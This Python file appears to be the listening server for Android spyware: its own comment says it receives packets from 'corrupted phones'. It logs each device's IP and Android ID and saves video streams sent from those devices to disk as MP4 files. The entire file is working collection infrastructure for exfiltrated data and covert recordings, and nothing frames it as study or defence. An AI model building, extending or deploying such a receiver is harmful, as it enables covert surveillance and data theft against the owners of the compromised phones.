# Server listening for the packets from the corrupted phones

import socket
import threading 
import os

from parser import receive_packet

host='192.168.1.32'
port1=12345
port2=12346

ip_id = {} #make a correspondence between ip and android id

# --------- MAKE A NEW IP / ID CORRESPONDENCE --------



def new_ip_id(ip, id):
    lines = []

    with open("ip_id.txt", 'r+') as ip_id:
        for line in ip_id:
            if line.strip():  # Vérifier si la ligne n'est pas vide
                ips, ids = line.strip().split()

                if ip == ips and id == ids:
                    return

                if id == ids and ip != ips:
                    continue

                lines.append(line.strip())

        lines.append(f"{ip} {id}")
        ip_id.seek(0)

        for line in lines:
            ip_id.write(f"{line}\n")

        ip_id.truncate()

# ------------- SERVER RECEIVING DATA -----------------


def data_server(port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))

    server_socket.listen(5)

    print("Waiting for connections...")


    while (True):
        client_socket, addr = server_socket.accept()

        print("Connection set with ", addr)
        data = client_socket.recv(1024)
        ip, id = receive_packet(addr, data)
        ip = ip[0]

        print(f"Received from {ip}")
        new_ip_id(ip, id)



        if not data:
            break

    client_socket.close()
    server_socket.close()



# ------------- SERVER RECEIVING VIDEOS -----------------


def handle_client(client_socket, ip):

    with open("ip_id.txt", 'r+') as ip_id:
        for line in ip_id:
            if line.strip():  # Vérifier si la ligne n'est pas vide
                ips, ids = line.strip().split()

                if ip == ips:
                    id = ids



    with client_socket:
        with open("../video/"+id+".mp4", 'wb') as file:
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break  

                file.write(data)

        print(f"Video has been received.")

def video_server(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"Server listening on {host}:{port}")

    while True:
        client_socket, addr = server.accept()
        ip = addr[0]
        print(f"Accepted connection from {addr}")
        client_thread = threading.Thread(target=handle_client, args=(client_socket, ip,))
        client_thread.start()


threading.Thread(target=data_server, args=(port1,)).start()
threading.Thread(target=video_server, args=(port2,)).start()
